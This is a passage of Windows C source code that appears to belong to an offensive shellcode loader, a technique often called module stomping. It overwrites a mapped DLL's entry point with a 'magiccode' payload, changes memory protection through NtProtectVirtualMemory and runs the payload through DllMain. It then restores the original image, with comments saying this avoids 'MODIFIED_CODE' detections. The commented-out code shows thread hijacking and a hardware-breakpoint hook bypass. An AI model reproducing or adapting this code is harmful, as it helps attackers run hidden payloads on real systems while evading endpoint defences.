    // PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    // DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;


    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
    DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
    PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)fileBase);
    DWORD sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
    printf("[+] DLL entry point: %p\n", dllEntryPoint);
    printf("[+] Size of image: %lu bytes\n", sizeOfImage);
    ///back the f*** up
    // void* dllBackup = malloc(sizeOfImage);
    // void* dllBackup = VirtualAlloc(NULL, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    HANDLE hHeap = HeapCreate(0, sizeOfImage, 0);
    if (hHeap == NULL) {
        printf("HeapCreate failed: %lu\n", GetLastError());
    }

    void* dllBackup = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeOfImage);

    if (dllBackup == NULL) {
        // Handle memory allocation failure
        printf("[-] Memory allocation failed. Error: %lu\n", GetLastError());
    }

    // Copy the DLL image to the allocated buffer
    memcpy(dllBackup, fileBase, sizeOfImage);
    /// back up memory done. 

    // // Load the DLL to get its base address in current process
    // // HMODULE hDll = LoadLibraryW(dllPath);
    // HMODULE hDll = dynamic::loadFuture(dllPath);

    // if (hDll == NULL) {
    //     printf("Failed to load DLL. Error: %lu\n", GetLastError());
    //     if(bUseLdrLoadDll) {
    //         UnmapViewOfFile(fileBase);
    //     } else {
    //         UnmapViewOfFile(fileHandle);
    //         UnmapViewOfFile(fileBase);
    //         CloseHandle(hSection);
    //     }
    //     return 1;
    // } else { 
	// 	printf("[+] DLL loaded.\n");
	// }

    // // Calculate the AddressOfEntryPoint in current process
    // // LPVOID dllEntryPoint = (LPVOID)(entryPointRVA + (DWORD_PTR)hDll);
	// // printf("[+] DLL entry point: %p\n", dllEntryPoint);
    // PVOID dllEntryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)hDll);
	// // printf("[+] DLL entry point: %p\n", dllEntryPoint);
    // wprintf(L"Using DLL: %ls\n", dllPath);

    // Overwrite the AddressOfEntryPoint with magiccode
    // SIZE_T bytesWritten;
    // BOOL result = WriteProcessMemory(GetCurrentProcess(), dllEntryPoint, magiccode, sizeof(magiccode), &bytesWritten);

    ///////////////////////////// Let's get the memory protection of the target DLL's entry point before any modification: 
    HANDLE hProcess = GetCurrentProcess();
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T result;

    result = VirtualQueryEx(hProcess, dllEntryPoint, &mbi, sizeof(mbi));

    if (result == 0) {
        printf("VirtualQueryEx failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] Default memory protection in target DLL is: %s\n", ProtectionToString(mbi.Protect));
    }

    SIZE_T magiccodeSize = sizeof(magiccode);
    printf("[**] magiccodeSize: %lu\n", magiccodeSize);

    printf("[*] dllEntryPoint: %p\n", dllEntryPoint);

    // DWORD oldProtect = 0;
    // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
    //     printf("VirtualProtectEx failed to change memory protection. Error: %lu\n", GetLastError());
    //     CloseHandle(hProcess);
    //     return 1;
    // }

    // if (!VirtualProtect(dllEntryPoint, magiccodeSize, PAGE_READWRITE, &oldProtect)) {
    //     printf("VirtualProtect failed to change memory protection. Error: %lu\n", GetLastError());
    //     CloseHandle(hProcess);
    //     return 1;
    // }

    // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)dynamic::NotGetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");
    //use the normal way:
    // NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)GetProcAddress(GetModuleHandleA("ntdll"), "NtProtectVirtualMemory");


    PVOID baseAddress = dllEntryPoint; // BaseAddress must be a pointer to the start of the memory region
    SIZE_T regionSize = magiccodeSize; // The size of the region
    ULONG oldProtect;


    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        PAGE_READWRITE, // The new protection attributes
        &oldProtect); // The old protection attributes

    if(status != STATUS_SUCCESS) {
        printf("NtProtectVirtualMemory failed to change memory protection. Status: %x\n", status);
        return 1;
    } else {
        printf("[+] Memory protection after change was: %s\n", ProtectionToString(oldProtect));
    }
    printf("[+] Default memory protection before change in target DLL was: %s\n", ProtectionToString(oldProtect));

    if (hProcess != NULL) {
        result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)magiccode, magiccodeSize, bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
    }

    // if (!VirtualProtectEx(hProcess, dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
    //     printf("[-] VirtualProtectEx failed to restore original memory protection. Error: %lu\n", GetLastError());
    // }

    // if (!VirtualProtect(dllEntryPoint, magiccodeSize, oldProtect, &oldProtect)) {
    //     printf("[-] VirtualProtect failed to restore original memory protection. Error: %lu\n", GetLastError());
    // }


    printf("[+] press any key to continue\n");
    getchar();
    /// NtProtectVirtualMemory cause Modified code flags in .text and .rdata section in the target DLL.

    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        PAGE_EXECUTE_READ, // The new protection attributes
        &oldProtect); // The old protection attributes
    if(status != STATUS_SUCCESS) {
        printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
    } else {
        printf("[+] Memory protection after change was: %s\n", ProtectionToString(oldProtect));
    }

    // printf("[+] Memory protection after change was: %s\n", ProtectionToString(oldProtect));

    if (result) {
        printf("Failed to write magiccode. Error: %lu\n", GetLastError());
        // FreeLibrary(hDll);
        // CloseHandle(hSection);
        UnmapViewOfFile(fileBase);
        // CloseHandle(fileMapping);
        // CloseHandle(fileHandle);
        // return 1;
    } else {
		printf("[+] Magic code casted.\n");
	}


    printf("[+] press any key to continue\n");
    getchar();


    if (fileBase != NULL) {
        // The entry point can typically be found in the PE header's OptionalHeader.AddressOfEntryPoint
        // PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleHandle;
        // PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleHandle + dosHeader->e_lfanew);
        // DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
        // PVOID entryPoint = (PVOID)((BYTE*)moduleHandle + entryPointRVA);


        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBase;
        PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileBase + dosHeader->e_lfanew);
        DWORD entryPointRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
        PVOID entryPoint = (PVOID)(entryPointRVA + (DWORD_PTR)fileBase);
        printf("[+] Entry point: %p\n", entryPoint);
        // getchar();

        // The entry point of a DLL is the DllMain function
        typedef BOOL(WINAPI *DllMainPtr)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
        DllMainPtr dllMain = (DllMainPtr)entryPoint;

        // Call the entry point with DLL_PROCESS_ATTACH
        if (dllMain((HINSTANCE)fileBase, DLL_PROCESS_ATTACH, NULL)) {
            wprintf(L"DLL entry point executed successfully.\n");
        } else {
            wprintf(L"Failed to execute DLL entry point.\n");
        }
    }
    
    // restorte the backup memeory to avoid MODIFIED_CODE and XMAP: 
    // Ensure the memory region where the DLL is loaded is writable
    DWORD oldoldProtect;
    VirtualProtect(dllEntryPoint, sizeOfImage, PAGE_EXECUTE_READWRITE, &oldoldProtect);

    // Copy the DLL image back to its original location
    memcpy(dllEntryPoint, dllBackup, sizeOfImage);
    getchar();
    // Restore the original memory protections
    VirtualProtect(dllEntryPoint, sizeOfImage, oldoldProtect, &oldoldProtect);

    // Free the allocated buffer
    free(dllBackup);
    // restorte the backup memeory to avoid MODIFIED_CODE and XMAP: 



    //Use NT method: 

    // NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)dynamic::NotGetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
    // if (!pNtCreateThreadEx) {
    //     printf("[-] Failed to locate NtCreateThreadEx.\n");
    //     return 1;
    // }
    HANDLE hThread = NULL;
    // status = pNtCreateThreadEx(
    //     &hThread,
    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
    //     NULL,
    //     hProcess,
    //     dllEntryPoint,
    //     NULL,
    //     FALSE,
    //     0,
    //     0,
    //     0,
    //     NULL);

    // Create a suspended thread using the pNtCreateThreadEx:
    // suspended thread!!!!!!!!!!!!!!!!!!!!!!!
    // status = pNtCreateThreadEx(
    //     &hThread,
    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
    //     NULL,
    //     hProcess,
    //     dllEntryPoint,
    //     NULL,
    //     TRUE,
    //     0,
    //     0,
    //     0,
    //     NULL);
    
    
    // if (status != 0) {
    //     printf("[-] Failed to create remote thread: %lu\n", status);
    //     return 1;
    // }

/// create a unsigned char shellcode that does nothing, no ops
    // unsigned char shellcode[] = 
    //     "\x00\x00\x00\x00\x00\x00" // NOP
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x90\x90\x90\x90\x90\x90"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x90\x90\x90\x90\x90\x90"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x90\x90\x90\x90\x90\x90"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x90\x90\x90\x90\x90\x90"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x90\x90\x90\x90\x90\x90"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x90\x90\x90\x90\x90\x90"
    //     "\x00\x00\x00\x00\x00\x00"
    //     "\x90\x90\x90\x90\x90\x90";


    // if (hProcess != NULL) {
    //     result = WriteProcessMemoryAPC(hProcess, (BYTE*)dllEntryPoint, (BYTE*)shellcode, sizeof(shellcode), bUseRtlCreateUserThread, bUseCreateThreadpoolWait); 
    // }
    // HANDLE hThread = NULL;
    // status = pNtCreateThreadEx(
    //     &hThread,
    //     NT_CREATE_THREAD_EX_ALL_ACCESS,
    //     NULL,
    //     hProcess,
    //     dllEntryPoint,
    //     NULL,
    //     FALSE,
    //     0,
    //     0,
    //     0,
    //     NULL);

    // if (status != 0) {
    //     printf("[-] Failed to create remote thread: %lu\n", status);
    // }
    // printf("[+] NtCreateThreadEx succeeded\n");
    
    
    // Create a thread to execute at the DLL's entry point
    // DWORD threadID;
    // HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, &threadID);
    // if (hThread == NULL) {
    //     printf("Failed to create a thread. Error: %lu\n", GetLastError());
    //     FreeLibrary(hDll);
    //     UnmapViewOfFile(fileBase);
    //     // CloseHandle(fileMapping);
    //     CloseHandle(fileHandle);
    //     CloseHandle(hSection);
    //     return 1;
    // }
	// printf("[+] No need to create thread.\n");

    // Wait for the thread to execute and then clean up
    // WaitForSingleObject(hThread, INFINITE);

    // if(bUseLdrLoadDll) {
    //     UnmapViewOfFile(fileBase);
    // } else {
    //     UnmapViewOfFile(fileHandle);
    //     UnmapViewOfFile(fileBase);
    //     // CloseHandle(hSection);
    // }

    // HMODULE hDll2 = LoadLibraryW(dllPath);
    // printf("[*] Sleep without Sleep. \n");
    // SimpleSleep(5000000);
	// HANDLE new_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL);
    // if (new_thread == NULL) {
    //     printf("CreateThread failed: %d\n", GetLastError());
    //     // return -1;
    // } else {
    //     printf("CreateThread succeeded.\n");
    // }
    // CONTEXT thread_context = { 0 };
    // thread_context.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
    // g_thread_handle = new_thread;

    // printf("Attempting bypass using hardware breakpoints\n");
    // BypassHookUsingBreakpoints();

    // // get the context of the main thread in the new process (used to call its entrypoint)
    // if (!GetThreadContext(new_thread, &thread_context)) {
    //     printf("GetThreadContext() Failed with error: %d\n", GetLastError());
    // }
	// thread_context.Rax = (DWORD64)dllEntryPoint;
	// SetThreadContext(new_thread, &thread_context);
    getchar();

    // Assuming hThread is valid and points to a suspended thread
    // CONTEXT context;
    // ZeroMemory(&context, sizeof(CONTEXT));
    // context.ContextFlags = CONTEXT_FULL; // Get the full context
    // if (GetThreadContext(new_thread, &context)) {
    //     #ifdef _M_IX86 // If the target is x86
    //     context.Eip = (DWORD64)dllEntryPoint;
    //     // context.Ecx = (DWORD64)dllEntryPoint;
    //     #elif defined(_M_X64) // If the target is x64
    //     context.Rip = (DWORD64)dllEntryPoint;
    //     // context.R8 = (DWORD64)dllEntryPoint;
    //     // context.Rcx = (DWORD64)dllEntryPoint;
    //     // context.Rax = 0xC0000156;
    //     // set the memory permission to PAGE_EXECUTE_READ WITH context


    //     // context.Rcx = (DWORD64)dllEntryPoint;
    //     #endif
    //     //print the entry point from context:
    //     printf("[+] Entry point from context: %p\n", context.Rax);


    //     if (!SetThreadContext(new_thread, &context)) {
    //         // Handle error
    //         printf("[-] Failed to set thread context: %d\n", GetLastError());

    //     } else {
    //         // Success
    //         printf("[+] Thread context set successfully.\n");
    //     }
    // }

    // if (ResumeThread(new_thread) == -1) {
    //     printf("Failed to resume thread: %d\n", GetLastError());
    // } else {
    //     printf("[+] Thread resumed successfully.\n");
    // }


    // BOOL rEsult = ChangeMemoryProtectionToNoAccess(&mbi);
    // if (!rEsult) {
    //     printf("[-] Failed to change memory protection to PAGE_NOACCESS. Error: %lu\n", GetLastError());
    // } else {
    //     printf("[+] Memory protection changed to PAGE_NOACCESS.\n");
    // }

    // MyNtWaitForSingleObject(new_thread, FALSE, NULL);


    // // Use the NtCreateThreadEx function to create a new thread that starts executing the magiccode
    // NtCreateThreadEx(&hThread, GENERIC_EXECUTE, 0, hProcess, allocBuffer, 0, 0, 0, 0, 0, 0);

    // Use the NtWaitForSingleObject function to wait for the new thread to finish executing

    //create a function that does the same as NtWaitForSingleObject:
    // WaitForSingleObject(new_thread, INFINITE);


    printf("[+] press any key to continue\n");
    getchar();
    // if (WaitForSingleObject(hThread, 5000) == WAIT_TIMEOUT) { // Wait 5 seconds
    //     TerminateThread(hThread, 0); // Forcibly terminates the thread
    //     printf("[+] Default thread was terminated.\n");
    // }

    // // Get the exit code of the thread.
    // DWORD exitCode = 0;
    // if (!GetExitCodeThread(hThread, &exitCode)) {
    //     printf("[-] GetExitCodeThread failed: %d\n", GetLastError());
    // } else {
    //     printf("[+] Thread exited with code: %lu\n", exitCode);
    // }

    // CloseHandle(hThread);
    // FreeLibrary(hDll);
    // if(bUseLdrLoadDll) {
    //     UnmapViewOfFile(fileBase);
    // } else {
    //     UnmapViewOfFile(fileHandle);
    //     UnmapViewOfFile(fileBase);
    //     CloseHandle(hSection);
    // }
    // CloseHandle(fileMapping);
    // CloseHandle(fileHandle);
    // CloseHandle(hSection);
    // Terminate the process
    // ExitProcess(0);
    return 0;


}



BOOL PrintSectionDetails(const wchar_t* dllPath) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to open file %ls for section details. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        wprintf(L"Memory allocation failed for reading file %ls.\n", dllPath);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(fileBuffer);
        CloseHandle(hFile);
        wprintf(L"Failed to read file %ls. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileBuffer + dosHeader->e_lfanew);
    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Size of Image: 0x%X\n", ntHeaders->OptionalHeader.SizeOfImage); // Print Size of Image
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders->FileHeader.SizeOfOptionalHeader);

    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
        wprintf(L"  Section %d: %.*S\n", i + 1, IMAGE_SIZEOF_SHORT_NAME, section->Name);
        wprintf(L"    Virtual Size: 0x%X\n", section->Misc.VirtualSize);
        wprintf(L"    Virtual Address: 0x%X\n", section->VirtualAddress);
        wprintf(L"    Size of Raw Data: 0x%X\n", section->SizeOfRawData);
    }

    free(fileBuffer);
    CloseHandle(hFile);
    return TRUE;
}
